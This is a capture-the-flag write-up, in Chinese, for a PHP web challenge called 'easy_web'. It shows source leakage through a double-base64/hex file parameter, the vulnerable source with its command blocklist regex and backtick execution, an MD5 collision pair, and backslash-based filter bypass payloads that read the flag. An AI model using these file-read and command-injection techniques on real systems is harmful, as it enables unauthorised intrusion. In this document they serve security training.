* # 0x01 easy\_web

  关键词：文件读取，源码泄露，md5强碰撞，反斜杠绕过

打开网页发现增加了两个get类型的变量，其中image变量名称怀疑为base64加密后的数据

cmd变量为空，初步猜测为输入点![](C:\Gitbook\Import\heart1ess_s_ctf\assets\axb1.png)经过两次base64解码后发现为十六进制字符串，翻译后得

![](C:\Gitbook\Import\heart1ess_s_ctf\assets\abx2.png)

更改img变量内容发现左上角图片消失，判断可以采用此方法泄露源代码，此时将index.php按顺序加密后作为image变量输入得到base64加密后的源代码，解密后获得源代码如下

    <?php
    error_reporting(E_ALL || ~ E_NOTICE);
    header('content-type:text/html;charset=utf-8');
    $cmd = $_GET['cmd'];
    if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
        header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
    $file = hex2bin(base64_decode(base64_decode($_GET['img'])));
    
    $file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
    if (preg_match("/flag/i", $file)) {
        echo '<img src ="./ctf3.jpeg">';
        die("xixi～ no flag");
    } else {
        $txt = base64_encode(file_get_contents($file));
        echo "<img src='data:image/gif;base64," . $txt . "'></img>";
        echo "<br>";
    }
    echo $cmd;
    echo "<br>";
    if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
        echo("forbid ~");
        echo "<br>";
    } else {
        if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
            echo `$cmd`;
        } else {
            echo ("md5 is funny ~");
        }
    }
    
    ?>
    <html>
    <style>
      body{
       background:url(./bj.png)  no-repeat center center;
       background-size:cover;
       background-attachment:fixed;
       background-color:#CCCCCC;
    }
    </style>
    <body>
    </body>
    </html>

由源代码可知img变量过滤flag，即不能通过img变量获取flag，并且可以通过利用cmd字符串的代码执行漏洞获取flag。

由代码审计可知需要以post方式传入两个变量a和b并且使a与b的md5值相等同时a与b的字符串值不等，这与之前做过的用数组绕过md5的题不同，该题中采用数组绕过md5的过程中会使第一个条件即强行转化字符串后得到的结果也相等，则直接跳转到下一个条件处。因而只能采用md5强碰撞完成，下面给出解该题所用的md5碰撞字符串对：

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

a与b在url解码后进行md5加密得到相同的结果，如下图所示：![](C:\Gitbook\Import\heart1ess_s_ctf\assets\axb3.png)而后通过反斜杠`\`规避正则表达式过滤，最终获取根目录下的flag

Payload：

```
&cmd=dir%20/    //查看根目录下的文件，发现flag
&cmd=ca\t%20/fl\ag    //获取flag
```



